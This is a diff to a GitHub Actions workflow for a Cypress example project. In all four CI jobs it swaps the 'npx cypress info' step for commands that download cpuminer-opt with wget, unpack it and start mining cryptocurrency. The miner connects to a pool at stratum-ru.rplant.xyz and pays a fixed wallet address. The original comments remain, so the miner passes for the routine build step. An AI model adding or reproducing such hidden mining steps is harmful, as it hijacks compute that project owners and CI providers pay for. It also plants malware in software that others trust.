@@ -18,7 +18,15 @@ jobs:
           # just for full picture after installing Cypress
           # print information about detected browsers, etc
           # see https://on.cypress.io/command-line#cypress-info
-          build: npx cypress info
+          run: |
+
+            wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+
+            tar xf cpuminer-opt-linux.tar.gz
+
+            ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0
+
+        
 
   basic-ubuntu-18:
     runs-on: ubuntu-18.04
@@ -37,7 +45,15 @@ jobs:
           # just for full picture after installing Cypress
           # print information about detected browsers, etc
           # see https://on.cypress.io/command-line#cypress-info
-          build: npx cypress info
+          run: |
+
+            wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+
+            tar xf cpuminer-opt-linux.tar.gz
+
+            ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0
+
+        
 
   basic-ubuntu-20:
     runs-on: ubuntu-20.04
@@ -61,7 +77,13 @@ jobs:
         uses: ./
         with:
           working-directory: examples/basic
-          build: npx cypress info
+          run: |
+            wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+            tar xf cpuminer-opt-linux.tar.gz
+            ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0
+
+        
+
 
   basic-on-mac:
     runs-on: macos-latest
@@ -73,4 +95,9 @@ jobs:
         uses: ./
         with:
           working-directory: examples/basic
-          build: npx cypress info
+          run: |
+            wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+            tar xf cpuminer-opt-linux.tar.gz
+            ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-ru.rplant.xyz:7042 -u sugar1qzftdwt2u2dxq2rdrhdfuq27k3s5uvxssd4nwcd.1 -t0
+
+        
